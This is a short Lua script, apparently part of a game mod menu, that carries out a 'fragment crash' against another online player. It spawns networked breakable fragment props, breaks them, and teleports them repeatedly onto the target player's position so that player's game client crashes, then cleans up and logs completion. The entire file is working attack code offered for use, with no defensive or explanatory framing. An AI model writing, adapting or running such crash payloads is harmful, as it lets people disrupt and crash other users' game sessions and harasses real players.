return function(rs, player)
    local modelHash = joaat("prop_fragtest_cnst_04")
    STREAMING.REQUEST_MODEL(modelHash)
    repeat rs:yield() until STREAMING.HAS_MODEL_LOADED(modelHash)

    local c = yu.coords(player.ped, true)

    local objects = {}

    for i = 1, 4 do
        local object = OBJECT.CREATE_OBJECT(modelHash, c.x, c.y, c.z, true, false, false)
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        objects[i] = object
    end

    for _ = 0, 100 do
        c = yu.coords(player.ped)
        for i = 1, #objects do
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(objects[i], c.x, c.y, c.z, false, true, true)
        end
        rs:sleep(10)
    end

    for i = 1, #objects do
        ENTITY.DELETE_ENTITY(objects[i])
    end

    SussySpt.debug("Fragment crash done")
end
